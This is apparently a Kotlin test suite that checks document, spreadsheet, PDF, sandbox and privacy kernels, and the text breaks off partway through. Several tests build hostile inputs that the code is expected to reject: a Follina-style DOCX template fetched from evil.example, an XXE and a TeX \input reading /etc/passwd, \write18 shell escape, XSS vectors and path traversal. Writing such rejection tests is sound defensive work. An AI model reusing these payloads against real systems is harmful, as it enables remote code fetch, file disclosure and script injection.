// SPDX-License-Identifier: Apache-2.0
package dev.fusion.testing

import dev.fusion.a11y.ScreenReaderRedactor
import dev.fusion.airplay.AirPlayTxtRecord
import dev.fusion.airplay.RtspRangeHeader
import dev.fusion.alerts.EwmaAnomalyDetector
import dev.fusion.alerts.MaintenanceSilence
import dev.fusion.archive.PackIndexCompact
import dev.fusion.archive.ZipSafeExtract
import dev.fusion.automation.DagTaskRunner
import dev.fusion.backup.ReedSolomonGf256
import dev.fusion.beam.ContentRangeHttp
import dev.fusion.beam.NoiseFraming
import dev.fusion.benchmark.MicrobenchStats
import dev.fusion.browser.HtmlSanitizer
import dev.fusion.browser.model.AdblockFilterEngine
import dev.fusion.calc.SvgChartPlot
import dev.fusion.capabilities.WasiPreview1Host
import dev.fusion.capture.SmpteTimecode
import dev.fusion.cast.dlna.SoapActionEnvelope
import dev.fusion.castv2.CastChannelFrame
import dev.fusion.castv2.CastMediaStatus
import dev.fusion.commands.ArgvSpecParser
import dev.fusion.commands.UndoRedoStack
import dev.fusion.continuity.HandoffSessionTicket
import dev.fusion.designsystem.FluidTypeClamp
import dev.fusion.documents.LatexMathSvg
import dev.fusion.editor.DocumentDiffMerge
import dev.fusion.files.VarIntZigZag
import dev.fusion.filesui.ExtendedGlob
import dev.fusion.find.BooleanQueryAst
import dev.fusion.find.BoyerMooreHorspool
import dev.fusion.format.image.SvgSafeSubset
import dev.fusion.format.pdf.PdfOutlineBookmarks
import dev.fusion.hw.ImeTrustGate
import dev.fusion.index.Bm25Scorer
import dev.fusion.launcher.FuzzyAppSearch
import dev.fusion.lens.MrzIcao9303
import dev.fusion.lok.OdtRichWriter
import dev.fusion.maps.GeoJsonFeature
import dev.fusion.media.WavPcmHeader
import dev.fusion.media.WebVttCueParser
import dev.fusion.messages.DkimHeaderCanon
import dev.fusion.model.JsonPatchRfc6902
import dev.fusion.nativefmt.ArArchive
import dev.fusion.notes.WikiLinkGraph
import dev.fusion.ooxml.CellErr
import dev.fusion.ooxml.DocxRichDocument
import dev.fusion.ooxml.FormulaEval
import dev.fusion.ooxml.XlsxStyledBook
import dev.fusion.perf.HdrLatencyHist
import dev.fusion.privacy.ImuSideChannelGuard
import dev.fusion.privacy.RamWipeSchedule
import dev.fusion.privacy.TorSocksIsolation
import dev.fusion.psd.IccProfileHeader
import dev.fusion.security.ClipboardSensitiveGuard
import dev.fusion.security.SecureKeypadScrambler
import dev.fusion.settings.TomlConfigCodec
import dev.fusion.settingsui.RetryBackoff
import dev.fusion.shell.SecureSurfacePolicy
import dev.fusion.storage.BTreePageIndex
import dev.fusion.terminal.PromptOsc133
import dev.fusion.together.RgaTextSequence
import dev.fusion.vault.ShamirSecretGf256
import dev.fusion.windowing.TilingBinaryTree
import java.io.ByteArrayOutputStream
import java.io.File
import java.nio.ByteBuffer
import java.nio.ByteOrder
import java.nio.charset.StandardCharsets
import java.security.SecureRandom
import java.util.zip.CRC32
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream
import kotlin.math.abs
import kotlin.random.Random

/**
 * R47 host-JVM contract & adversarial property suite across all 49 new R47 kernels + touched FormulaEval (61 functions).
 *
 * Honesty note: executes on host JVM (`kotlinc 2.2.21` + OpenJDK 17). Does not claim Android SDK 37,
 * Compose UI, TalkBack device rendering, or hardware-enforced sensor/USB kernel mediation.
 */
object R47Checks {
    private var assertions = 0

    private fun checkTrue(cond: Boolean, msg: String = "assertion failed") {
        if (!cond) throw AssertionError("R47 FAIL: $msg")
        assertions++
    }

    private fun checkNear(actual: Double, expected: Double, eps: Double = 1e-6, msg: String = "numeric mismatch") {
        if (!actual.isFinite() || abs(actual - expected) > eps) {
            throw AssertionError("R47 FAIL ($msg): actual=$actual expected=$expected eps=$eps")
        }
        assertions++
    }

    private inline fun checkThrows(msg: String, block: () -> Unit) {
        var threw = false
        try {
            block()
        } catch (_: Throwable) {
            threw = true
        }
        if (!threw) throw AssertionError("R47 FAIL (expected exception): $msg")
        assertions++
    }

    @JvmStatic
    fun main(args: Array<String>) {
        val fixtureDir = File(if (args.isNotEmpty()) args[0] else "tools/fixtures/r47")
        val artifactDir = if (args.size >= 2) File(args[1]).apply { mkdirs() } else null

        testFormulaEvalR4761Functions()
        testDocxRichDocumentAndAdversarialRels(artifactDir)
        testXlsxStyledBookOpenpyxlArtifacts(artifactDir)
        testPdfOutlineBookmarksAndSafeLinks(artifactDir)
        testOdtRichWriterMagicAndRoundTrip(artifactDir)
        testLatexMathSvgAndAdversary(artifactDir)
        testDocumentDiffMergeMyersAnd3Way()
        testSvgChartPlotAllModes(artifactDir)
        testWikiLinkGraphAndPageRank()

        testHtmlSanitizerDomPurifyVectors()
        testWasiPreview1CapabilitySandbox()
        testAdblockFilterEngineFixture(fixtureDir)
        testJsonPatchRfc6902Fixture(fixtureDir)
        testArgvSpecParserAndTypoHint()
        testHdrLatencyHistAndCoordinatedOmission()
        testBTreePageIndexPropertySweep()
        testZipSafeExtractSymlinkBombSlip()
        testTomlConfigCodecFixture(fixtureDir)

        testTorSocksIsolationProp351()
        testImuSideChannelGuardGlitchInTimeAndAlphaLogger()
        testSecureKeypadScramblerUniformityAndAx()
        testClipboardSensitiveGuardAndTtl()
        testImeTrustGateMatrix()
        testRamWipeScheduleZeroization()
        testScreenReaderRedactorStalkerwareVsTalkBack()
        testSecureSurfacePolicyRoutes()

        testFluidTypeClampReflow()
        testFuzzyAppSearchRanking()
        testBooleanQueryAstSearch()
        testExtendedGlobPolynomial()
        testPromptOsc133Terminal()
        testWebVttCueParserFixture(fixtureDir)
        testGeoJsonFeatureFixture(fixtureDir)
        testReedSolomonGf256ErasureProperty()
        testMaintenanceSilenceSecurityFloor()
        testWavPcmHeaderAndAudioMeter(artifactDir)
        testPackIndexCompactGitV2(artifactDir)
        testNoiseFramingTransportAndReplay()

        testRgaTextSequenceCommutativityProperty()
        testMrzIcao9303Td3AndTd1()
        testDkimHeaderCanonRfc6376()
        testRetryBackoffAndCircuitBreaker()
        testVarIntZigZagOverflowAndDelta()
        testArArchiveDebAndLongNames(artifactDir)
        testSvgSafeSubsetFirewall()
        testIccProfileHeaderAndBounds(artifactDir)
        testSoapActionEnvelopeUpnpAndXxe()
        testRtspRangeHeaderCodec()
        testCastMediaStatusReducer()
        testMicrobenchStatsTukeyAndWelch()
        testProductC12ModulesAndDeepProperties()

        println(
            "R47 PASS: $assertions production-kernel assertions across 61 new kernels (+5 touched across 48/50 modules). " +
                "Host JVM only; not Android/device evidence.",
        )
    }

    private fun testFormulaEvalR4761Functions() {
        checkTrue(FormulaEval.SCOPE.contains("61 pure functions") && FormulaEval.SCOPE.contains("35 pure functions"))
        val sheet = mapOf(
            "A1" to FormulaEval.CellInput.TextLiteral("North"),
            "B1" to FormulaEval.CellInput.TextLiteral("Hardware"),
            "C1" to FormulaEval.CellInput.NumberLiteral(100.0),
            "A2" to FormulaEval.CellInput.TextLiteral("North"),
            "B2" to FormulaEval.CellInput.TextLiteral("Software"),
            "C2" to FormulaEval.CellInput.NumberLiteral(250.0),
            "A3" to FormulaEval.CellInput.TextLiteral("North"),
            "B3" to FormulaEval.CellInput.TextLiteral("Software"),
            "C3" to FormulaEval.CellInput.NumberLiteral(350.0),
            "A4" to FormulaEval.CellInput.TextLiteral("South"),
            "B4" to FormulaEval.CellInput.TextLiteral("Software"),
            "C4" to FormulaEval.CellInput.NumberLiteral(400.0),
            // Plural criteria functions
            "D1" to FormulaEval.CellInput.Formula("=SUMIFS(C1:C4, A1:A4, \"North\", B1:B4, \"Software\")"),
            "D2" to FormulaEval.CellInput.Formula("=COUNTIFS(A1:A4, \"North\", B1:B4, \"Software\")"),
            "D3" to FormulaEval.CellInput.Formula("=AVERAGEIFS(C1:C4, A1:A4, \"North\", B1:B4, \">=\"&\"S\")"),
            "D4" to FormulaEval.CellInput.Formula("=AVERAGEIF(C1:C4, \">200\")"),
            // IronCalc Oct 23 2026 PR #10 regression: 1-cell XLOOKUP vector works; length mismatch returns #VALUE!
            "E1" to FormulaEval.CellInput.Formula("=XLOOKUP(\"North\", A1, C1, -1)"),
            "E2" to FormulaEval.CellInput.Formula("=XLOOKUP(\"North\", A1, C1:C2)"),
            "E3" to FormulaEval.CellInput.Formula("=XLOOKUP(\"South\", A1:A4, C1:C4, 0)"),
            "E4" to FormulaEval.CellInput.Formula("=XLOOKUP(\"West\", A1:A4, C1:C4, \"MISSING\")"),
            "E5" to FormulaEval.CellInput.Formula("=XMATCH(\"South\", A1:A4)"),
            "E6" to FormulaEval.CellInput.Formula("=CHOOSE(2, \"Bronze\", \"Silver\", \"Gold\")"),
            "E7" to FormulaEval.CellInput.Formula("=IFS(C1>500, \"XL\", C2>=250, \"M\", TRUE, \"S\")"),
            "E8" to FormulaEval.CellInput.Formula("=SWITCH(A4, \"North\", 1, \"South\", 2, 99)"),
            "E9" to FormulaEval.CellInput.Formula("=XOR(TRUE, FALSE, FALSE)"),
            "E10" to FormulaEval.CellInput.Formula("=XOR(TRUE, TRUE)"),
            // Text & Math & Finance
            "F1" to FormulaEval.CellInput.Formula("=TEXTJOIN(\" / \", TRUE, A1, \"\", B2)"),
            "F2" to FormulaEval.CellInput.Formula("=SUBSTITUTE(\"foo-bar-foo\", \"foo\", \"baz\", 2)"),
            "F3" to FormulaEval.CellInput.Formula("=FIND(\"Soft\", B2)"),
            "F4" to FormulaEval.CellInput.Formula("=PROPER(\"fUSION sHELL oFFICE\")"),
            "F5" to FormulaEval.CellInput.Formula("=EXACT(\"North\", \"north\")"),
            "F6" to FormulaEval.CellInput.Formula("=CEILING(23.2, 5)"),
            "F7" to FormulaEval.CellInput.Formula("=FLOOR(23.8, 5)"),
            "F8" to FormulaEval.CellInput.Formula("=SIGN(-42)"),
            "F9" to FormulaEval.CellInput.Formula("=LOG10(1000)"),
            "F10" to FormulaEval.CellInput.Formula("=ROUND(LN(EXP(3)), 6)"),
            // Financial TVM identity: PV(r, nper, PMT(r, nper, -pv0)) == -pv0
            "G1" to FormulaEval.CellInput.Formula("=PMT(0.05/12, 60, -10000)"),
            "G2" to FormulaEval.CellInput.Formula("=PV(0.05/12, 60, G1)"),
            "G3" to FormulaEval.CellInput.Formula("=FV(0.06, 10, 0, -1000)"),
            "G4" to FormulaEval.CellInput.Formula("=NPV(0.10, 110, 121)"),
            // HLOOKUP row table
            "H1" to FormulaEval.CellInput.TextLiteral("Q1"),
            "I1" to FormulaEval.CellInput.TextLiteral("Q2"),
            "H2" to FormulaEval.CellInput.NumberLiteral(42.0),
            "I2" to FormulaEval.CellInput.NumberLiteral(84.0),
            "J1" to FormulaEval.CellInput.Formula("=HLOOKUP(\"Q2\", H1:I2, 2, FALSE)"),
        )
        val out = FormulaEval.evaluateSheet(sheet).values
        checkNear((out["D1"] as FormulaEval.CellValue.Num).value, 600.0, msg = "SUMIFS")
        checkNear((out["D2"] as FormulaEval.CellValue.Num).value, 2.0, msg = "COUNTIFS")
        checkNear((out["D3"] as FormulaEval.CellValue.Num).value, 300.0, msg = "AVERAGEIFS")
        checkNear((out["D4"] as FormulaEval.CellValue.Num).value, 1000.0 / 3.0, msg = "AVERAGEIF")
        checkNear((out["E1"] as FormulaEval.CellValue.Num).value, 100.0, msg = "XLOOKUP 1-cell ref")
        checkTrue((out["E2"] as FormulaEval.CellValue.Err).error == CellErr.Err.VALUE, "XLOOKUP 1 vs 2 length mismatch -> #VALUE!")
        checkNear((out["E3"] as FormulaEval.CellValue.Num).value, 400.0, msg = "XLOOKUP range")
        checkTrue((out["E4"] as FormulaEval.CellValue.Text).value == "MISSING", "XLOOKUP if_not_found")
        checkNear((out["E5"] as FormulaEval.CellValue.Num).value, 4.0, msg = "XMATCH")
        checkTrue((out["E6"] as FormulaEval.CellValue.Text).value == "Silver", "CHOOSE")
        checkTrue((out["E7"] as FormulaEval.CellValue.Text).value == "M", "IFS")
        checkNear((out["E8"] as FormulaEval.CellValue.Num).value, 2.0, msg = "SWITCH")
        checkTrue((out["E9"] as FormulaEval.CellValue.Bool).value, "XOR odd")
        checkTrue(!(out["E10"] as FormulaEval.CellValue.Bool).value, "XOR even")
        checkTrue((out["F1"] as FormulaEval.CellValue.Text).value == "North / Software", "TEXTJOIN ignoreEmpty")
        checkTrue((out["F2"] as FormulaEval.CellValue.Text).value == "foo-bar-baz", "SUBSTITUTE nth")
        checkNear((out["F3"] as FormulaEval.CellValue.Num).value, 1.0, msg = "FIND")
        checkTrue((out["F4"] as FormulaEval.CellValue.Text).value == "Fusion Shell Office", "PROPER")
        checkTrue(!(out["F5"] as FormulaEval.CellValue.Bool).value, "EXACT case-sensitive")
        checkNear((out["F6"] as FormulaEval.CellValue.Num).value, 25.0, msg = "CEILING")
        checkNear((out["F7"] as FormulaEval.CellValue.Num).value, 20.0, msg = "FLOOR")
        checkNear((out["F8"] as FormulaEval.CellValue.Num).value, -1.0, msg = "SIGN")
        checkNear((out["F9"] as FormulaEval.CellValue.Num).value, 3.0, msg = "LOG10")
        checkNear((out["F10"] as FormulaEval.CellValue.Num).value, 3.0, msg = "LN(EXP(3))")
        checkNear((out["G1"] as FormulaEval.CellValue.Num).value, 188.712336, 1e-4, msg = "PMT")
        checkNear((out["G2"] as FormulaEval.CellValue.Num).value, -10000.0, 1e-4, msg = "PV(PMT) inverse")
        checkNear((out["G3"] as FormulaEval.CellValue.Num).value, 1790.847696, 1e-4, msg = "FV")
        checkNear((out["G4"] as FormulaEval.CellValue.Num).value, 200.0, 1e-6, msg = "NPV")
        checkNear((out["J1"] as FormulaEval.CellValue.Num).value, 84.0, msg = "HLOOKUP")
    }

    private fun testDocxRichDocumentAndAdversarialRels(artifactDir: File?) {
        val doc = DocxRichDocument.RichDoc(
            blocks = listOf(
                DocxRichDocument.RichBlock.TableOfContents("Contents", maxLevel = 3),
                DocxRichDocument.RichBlock.Heading(1, "1. Executive Summary"),
                DocxRichDocument.RichBlock.Paragraph("Offline rich Writer package.", footnoteId = 1, commentId = 1, bold = true),
                DocxRichDocument.RichBlock.Heading(2, "1.1 Threat Model"),
                DocxRichDocument.RichBlock.Revision(1, "Alice", DocxRichDocument.RevisionKind.INSERT, "Added zero-trust gate."),
                DocxRichDocument.RichBlock.Revision(2, "Bob", DocxRichDocument.RevisionKind.DELETE, "Legacy telemetry."),
                DocxRichDocument.RichBlock.Table(listOf("Module", "Status"), listOf(listOf("Writer", "Host-Verified"))),
            ),
            headerText = "Fusion Confidential",
            footerText = "Page Footer",
            footnotes = listOf(DocxRichDocument.Footnote(1, "ECMA-376 Part 1 WordprocessingML.")),
            comments = listOf(DocxRichDocument.Comment(1, "Reviewer", "Verify footnotes.xml round-trip.")),
        )
        val bytes = DocxRichDocument.write(doc)
        artifactDir?.let { File(it, "rich_sample.docx").writeBytes(bytes) }
        val parsed = DocxRichDocument.read(bytes)
        checkTrue(parsed.headerText == "Fusion Confidential", "DOCX header round-trip")
        checkTrue(parsed.footerText == "Page Footer", "DOCX footer round-trip")
        checkTrue(parsed.footnotes.size == 1 && parsed.footnotes[0].text.contains("ECMA-376"), "DOCX footnote")
        checkTrue(parsed.comments.size == 1 && parsed.comments[0].author == "Reviewer", "DOCX comment")
        checkTrue(parsed.tocEntries() == listOf(1 to "1. Executive Summary", 2 to "1.1 Threat Model"), "DOCX TOC")

        val scrubbed = parsed.stripEditorialMetadata()
        checkTrue(scrubbed.comments.isEmpty(), "stripEditorialMetadata clears comments")
        checkTrue(scrubbed.blocks.none { it is DocxRichDocument.RichBlock.Revision }, "revisions accepted/dropped")

        // Adversarial CVE-2017-0199 / Follina external template relationship injection must fail closed!
        val maliciousDocx = ByteArrayOutputStream().also { baos ->
            ZipOutputStream(baos).use { zos ->
                zos.putNextEntry(ZipEntry("word/_rels/document.xml.rels"))
                zos.write(
                    """<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rEvil" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://evil.example/payload.dotm" TargetMode="External"/></Relationships>"""
                        .toByteArray(),
                )
                zos.closeEntry()
                zos.putNextEntry(ZipEntry("word/document.xml"))
                zos.write("""<?xml version="1.0" encoding="UTF-8"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body/></w:document>""".toByteArray())
                zos.closeEntry()
            }
        }.toByteArray()
        checkThrows("External attachedTemplate rels refused") { DocxRichDocument.read(maliciousDocx) }
    }

    private fun testXlsxStyledBookOpenpyxlArtifacts(artifactDir: File?) {
        val headerStyle = XlsxStyledBook.CellStyle(bold = true, fontRgb = "FFFFFF", fillRgb = "1E3A8A", thinBorder = true)
        val currencyStyle = XlsxStyledBook.CellStyle(numberFormat = "$#,##0.00", thinBorder = true)
        val pctStyle = XlsxStyledBook.CellStyle(italic = true, numberFormat = "0.0%")
        val spec = XlsxStyledBook.WorkbookSpec(
            sheets = listOf(
                XlsxStyledBook.StyledSheet(
                    name = "Ledger",
                    freezeRows = 1,
                    freezeCols = 1,
                    columnWidths = mapOf(1 to 18.0, 2 to 14.0),
                    cells = listOf(
                        XlsxStyledBook.StyledCell("A1", XlsxStyledBook.StyledVal.Txt("Account"), headerStyle),
                        XlsxStyledBook.StyledCell("B1", XlsxStyledBook.StyledVal.Txt("Balance"), headerStyle),
                        XlsxStyledBook.StyledCell("C1", XlsxStyledBook.StyledVal.Txt("Share"), headerStyle),
                        XlsxStyledBook.StyledCell("A2", XlsxStyledBook.StyledVal.Txt("R&D"), XlsxStyledBook.CellStyle(thinBorder = true)),
                        XlsxStyledBook.StyledCell("B2", XlsxStyledBook.StyledVal.Num(12500.50), currencyStyle),
                        XlsxStyledBook.StyledCell("C2", XlsxStyledBook.StyledVal.Num(0.625), pctStyle),
                        XlsxStyledBook.StyledCell("A3", XlsxStyledBook.StyledVal.Txt("Ops")),
                        XlsxStyledBook.StyledCell("B3", XlsxStyledBook.StyledVal.Num(7500.00), currencyStyle),
                        XlsxStyledBook.StyledCell("B4", XlsxStyledBook.StyledVal.Formula("=SUM(B2:B3)", 20000.50), currencyStyle),
                    ),
                ),
            ),
            definedNames = listOf(XlsxStyledBook.DefinedName("TotalBudget", "Ledger!\$B\$2:\$B\$3")),
        )
        val bytes = XlsxStyledBook.write(spec)
        artifactDir?.let { File(it, "styled_ledger.xlsx").writeBytes(bytes) }
        val back = XlsxStyledBook.read(bytes)
        checkTrue(back.definedNames == spec.definedNames, "XlsxStyledBook definedNames")
        val sh = back.sheets.single()
        checkTrue(sh.freezeRows == 1 && sh.freezeCols == 1, "XlsxStyledBook freeze pane")
        checkNear(sh.columnWidths.getValue(1), 18.0, msg = "XlsxStyledBook col width")
        val b2 = sh.cells.first { it.ref == "B2" }
        checkTrue(b2.style.numberFormat == "$#,##0.00" && b2.style.thinBorder, "XlsxStyledBook currency style")
        val a1 = sh.cells.first { it.ref == "A1" }
        checkTrue(a1.style.bold && a1.style.fillRgb == "1E3A8A" && a1.style.fontRgb == "FFFFFF", "XlsxStyledBook header style")
    }

    private fun testPdfOutlineBookmarksAndSafeLinks(artifactDir: File?) {
        val elements = buildList {
            add(PdfOutlineBookmarks.Element.BookmarkHeading(1, "1. Architecture"))
            add(PdfOutlineBookmarks.Element.Paragraph("Clean-room bookmarked PDF 1.7 document."))
            add(PdfOutlineBookmarks.Element.Hyperlink("Project Repository", "https://github.com/jyvplay/OSB"))
            add(PdfOutlineBookmarks.Element.Table(listOf("Layer", "Guarantee"), listOf(listOf("Tor Prop 351", "<torS0X>0"))))
            for (sec in 2..18) {
                add(PdfOutlineBookmarks.Element.BookmarkHeading(2, "1.$sec Detailed Verification Section"))
                add(PdfOutlineBookmarks.Element.Paragraph("Line filler ".repeat(18)))
            }
        }
        val report = PdfOutlineBookmarks.render(elements)
        artifactDir?.let { File(it, "bookmarked_report.pdf").writeBytes(report.pdfBytes) }
        val ascii = String(report.pdfBytes, StandardCharsets.ISO_8859_1)
        checkTrue(report.pageCount >= 2, "Multi-page PDF pagination")
        checkTrue(report.bookmarks.size == 18 && ascii.contains("/Type /Outlines"), "PDF /Outlines tree")
        checkTrue(report.linkCount == 1 && ascii.contains("/Subtype /Link"), "PDF /Link annotation")
        checkTrue(!ascii.contains("/Producer") && !ascii.contains("/Author"), "Zero-metadata PDF trailer")
        checkThrows("javascript: URI refused in PDF annotation") {
            PdfOutlineBookmarks.Element.Hyperlink("Click", "javascript:app.alert(1)")
        }
    }

    private fun testOdtRichWriterMagicAndRoundTrip(artifactDir: File?) {
        val blocks = listOf(
            OdtRichWriter.OdtBlock.Heading(1, "OpenDocument 1.3 Report"),
            OdtRichWriter.OdtBlock.Paragraph(
                listOf(
                    OdtRichWriter.Span("Bold lead ", bold = true),
                    OdtRichWriter.Span("and code", monospace = true),
                ),
                footnote = "OASIS ODF 1.3 Part 2 §2.2.1 mimetype invariant.",
            ),
            OdtRichWriter.OdtBlock.Table(listOf("Format", "Magic"), listOf(listOf("ODT", "STORED@38"))),
        )
        val bytes = OdtRichWriter.write(blocks)
        artifactDir?.let { File(it, "rich_sample.odt").writeBytes(bytes) }
        checkTrue(OdtRichWriter.verifyMimetypeMagic(bytes), "ODF 1.3 STORED mimetype at byte 38")
        val back = OdtRichWriter.read(bytes)
        checkTrue(back.size == 3, "ODT 3 blocks round-trip")
        checkTrue((back[0] as OdtRichWriter.OdtBlock.Heading).text == "OpenDocument 1.3 Report", "ODT heading")
        val p = back[1] as OdtRichWriter.OdtBlock.Paragraph
        checkTrue(p.spans[0].bold && p.spans[1].monospace && p.footnote!!.contains("§2.2.1"), "ODT spans+footnote")
        // Section I REPAIR adversarial check: nested </text:p> inside footnote + DOCTYPE XXE inside ODT content.xml
        val poisonedOdt = ByteArrayOutputStream().also { baos ->
            ZipOutputStream(baos).use { zos ->
                zos.putNextEntry(ZipEntry("mimetype")); zos.write(OdtRichWriter.ODT_MIMETYPE.toByteArray()); zos.closeEntry()
                zos.putNextEntry(ZipEntry("content.xml"))
                zos.write("""<?xml version="1.0"?><!DOCTYPE lol [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0">&xxe;</office:document-content>""".toByteArray())
                zos.closeEntry()
            }
        }.toByteArray()
        checkThrows("ODT content.xml DOCTYPE XXE refused") { OdtRichWriter.read(poisonedOdt) }
    }

    private fun testLatexMathSvgAndAdversary(artifactDir: File?) {
        val expr = """\frac{-b \pm \sqrt{b^{2} - 4ac}}{2a} + \sum_{i=1}^{n} \alpha_{i}"""
        val svg = LatexMathSvg.renderSvg(expr)
        val mml = LatexMathSvg.renderMathMl(expr)
        artifactDir?.let { File(it, "quadratic_formula.svg").writeText(svg) }
        checkTrue(svg.startsWith("<svg ") && svg.contains("\u00B1") && svg.contains("\u2211") && svg.contains("\u03B1"), "Math SVG symbols")
        checkTrue(mml.contains("<mfrac>") && mml.contains("<msqrt>") && mml.contains("<msubsup>"), "MathML structure")
        checkThrows("TeX \\write18 shell-escape refused") { LatexMathSvg.parse("""\write18{id}""") }
        checkThrows("TeX \\input file-read refused") { LatexMathSvg.parse("""\input{/etc/passwd}""") }
        checkThrows("Deeply nested braces > MAX_DEPTH refused") {
            LatexMathSvg.parse("{".repeat(30) + "x" + "}".repeat(30))
        }
    }

    private fun testDocumentDiffMergeMyersAnd3Way() {
        val base = listOf("title: Spec", "status: draft", "body: hello", "footer: v1")
        val ours = listOf("title: Spec", "status: review", "body: hello", "footer: v1")
        val theirs = listOf("title: Spec", "status: draft", "body: hello", "footer: v2")
        val clean = DocumentDiffMerge.merge3(base, ours, theirs)
        checkTrue(clean.isClean && clean.lines == listOf("title: Spec", "status: review", "body: hello", "footer: v2"), "Disjoint 3-way merge")

        // Concurrent identical change must merge cleanly without conflict!
        val bothSame = DocumentDiffMerge.merge3(base, ours, ours)
        checkTrue(bothSame.isClean && bothSame.lines == ours, "Identical concurrent edit merges cleanly")

        // Divergent edit on same line produces exact conflict block
        val theirsConflict = listOf("title: Spec", "status: rejected", "body: hello", "footer: v1")
        val conflict = DocumentDiffMerge.merge3(base, ours, theirsConflict)
        checkTrue(!conflict.isClean && conflict.conflictCount == 1, "Divergent same-line edit -> 1 conflict")
        checkTrue(conflict.text.contains("<<<<<<< OURS") && conflict.text.contains(">>>>>>> THEIRS"), "Conflict markers")
        val udiff = DocumentDiffMerge.formatUnifiedDiff(base, ours)
        checkTrue(udiff.contains("-status: draft") && udiff.contains("+status: review"), "Unified diff")
    }

    private fun testSvgChartPlotAllModes(artifactDir: File?) {
        for (kind in SvgChartPlot.ChartKind.entries) {
            val series = if (kind == SvgChartPlot.ChartKind.PIE) {
                listOf(SvgChartPlot.Series("Share", listOf(45.0, 35.0, 20.0)))
            } else {
                listOf(
                    SvgChartPlot.Series("2025", listOf(12.0, 28.0, 19.0)),
                    SvgChartPlot.Series("2026", listOf(18.0, 34.0, 29.0)),
                )
            }
            val svg = SvgChartPlot.render(SvgChartPlot.ChartSpec(kind, "Metric <$kind>", listOf("Q1", "Q2", "Q3"), series))
            checkTrue(svg.startsWith("<svg ") && svg.contains("Metric &lt;$kind&gt;") && !svg.contains("<script"), "Chart $kind safe SVG")
            if (kind == SvgChartPlot.ChartKind.BAR) artifactDir?.let { File(it, "sample_bar_chart.svg").writeText(svg) }
        }
    }

    private fun testWikiLinkGraphAndPageRank() {
        val notes = listOf(
            WikiLinkGraph.NoteInput("hub", "Architecture Hub", "Core [[Writer Spec|Writer]] and [[Tor Design#Prop351]] #core/arch"),
            WikiLinkGraph.NoteInput("writer-spec", "Writer Spec", "Links back to [[Architecture Hub]] and [[Missing Page]] #office"),
            WikiLinkGraph.NoteInput(
                "tor-design",
                "Tor Design",
                "See [[Architecture Hub]] and ```\n[[Ignored Code Link]]\n``` plus `[[InlineIgnored]]` and\n~~~\n[[TildeFenceIgnored]]\n~~~",
            ),
            WikiLinkGraph.NoteInput("isolated", "Isolated Scratch", "No links at all"),
        )
        val idx = WikiLinkGraph.build(notes)
        checkTrue(idx.backlinks.getValue("hub") == setOf("writer-spec", "tor-design"), "Hub backlinks")
        checkTrue(idx.brokenLinks.single().targetSlug == "missing-page", "Broken link detected; fenced code link ignored")
        checkTrue(idx.orphanSlugs == setOf("isolated"), "Orphan note detected")
        checkNear(idx.pageRank.values.sum(), 1.0, 1e-6, "PageRank probability mass == 1.0")
        checkTrue(idx.pageRank.getValue("hub") > idx.pageRank.getValue("isolated"), "Hub outranks orphan")
    }

    private fun testHtmlSanitizerDomPurifyVectors() {
        val vectors = listOf(
            """<p onclick="alert(1)">Hello<script>evil()</script></p>""",
            """<div><template shadowrootmode="closed"><script>steal()</script><img src=x onerror=alert(1)></template>Safe</div>""",
            """<svg><foreignObject><iframe src="javascript:alert(1)"></iframe></foreignObject></svg><a href="j&#x09;avascript:alert(1)">Bad</a>""",
            """<a href="&#0000106;avascript:alert(1)">DecEntity</a><a href="https://example.org" target="_blank">Good</a>""",
            """<img src="data:text/html;base64,PHNjcmlwdD4=" alt="bad"><img src="https://example.org/a.png" width="120" onerror="x()">""",
        )
        for ((i, raw) in vectors.withIndex()) {
            val r = HtmlSanitizer.sanitize(raw)
            val lower = r.html.lowercase()
            checkTrue(!lower.contains("<script") && !lower.contains("onerror") && !lower.contains("onclick"), "XSS vector $i stripped")
            checkTrue(!lower.contains("javascript:") && !lower.contains("shadowroot") && !lower.contains("<foreignobject"), "ShadowRoot/URI vector $i stripped")
        }
        val good = HtmlSanitizer.sanitize("""<a href="https://example.org" target="_blank">Link</a>""")
        checkTrue(good.html.contains("""rel="noopener noreferrer""""), "Reverse-tabnabbing rel injected")
    }

    private fun testWasiPreview1CapabilitySandbox() {
        val docsDir = WasiPreview1Host.PreopenDir(
            guestMount = "/sandbox",
            rights = WasiPreview1Host.RIGHT_FD_READ or WasiPreview1Host.RIGHT_FD_WRITE or WasiPreview1Host.RIGHT_PATH_OPEN,
            files = linkedMapOf("hello.txt" to "Fusion WASI".toByteArray()),
        )
        val host = WasiPreview1Host.HostInstance(
            args = listOf("tool.wasm", "--check"),
            envVars = mapOf("LANG" to "C.UTF-8"),
            preopens = listOf(docsDir),
            clockQuantumNs = 100_000L,
        )
        checkTrue(host.argsSizesGet(0, 4) == WasiPreview1Host.ERRNO_SUCCESS && host.readI32(0) == 2, "WASI argc=2")

        // Path traversal escape "../etc/passwd" MUST fail closed with ERRNO_NOTCAPABLE (76)!
        val evilPath = "../etc/passwd".toByteArray()
        host.writeMem(256, evilPath)
        checkTrue(
            host.pathOpen(3, 256, evilPath.size, WasiPreview1Host.RIGHT_FD_READ, false, 512) == WasiPreview1Host.ERRNO_NOTCAPABLE,
            "WASI .. path escape -> ERRNO_NOTCAPABLE",
        )

        // Valid relative file read inside preopen fd=3
        val okPath = "sub/../hello.txt".toByteArray()
        host.writeMem(256, okPath)
        checkTrue(
            host.pathOpen(3, 256, okPath.size, WasiPreview1Host.RIGHT_FD_READ, false, 512) == WasiPreview1Host.ERRNO_SUCCESS,
            "WASI valid relative pathOpen",
        )
        val fileFd = host.readI32(512)
        host.writeI32(600, 1024) // iov.buf
        host.writeI32(604, 64)   // iov.len
        checkTrue(host.fdRead(fileFd, 600, 1, 616) == WasiPreview1Host.ERRNO_SUCCESS, "WASI fdRead")
        val nRead = host.readI32(616)
        checkTrue(String(host.memory, 1024, nRead) == "Fusion WASI", "WASI read payload")

        // Clock timing side-channel quantization check
        host.clockTimeGet(123_456_789L, 700)
        checkTrue(host.readI64(700) == 123_400_000L, "WASI clock quantized to 100us")
    }

    private fun testAdblockFilterEngineFixture(fixtureDir: File) {
        val rules = File(fixtureDir, "easylist_rules.txt").readLines()
        val eng = AdblockFilterEngine.compile(rules)
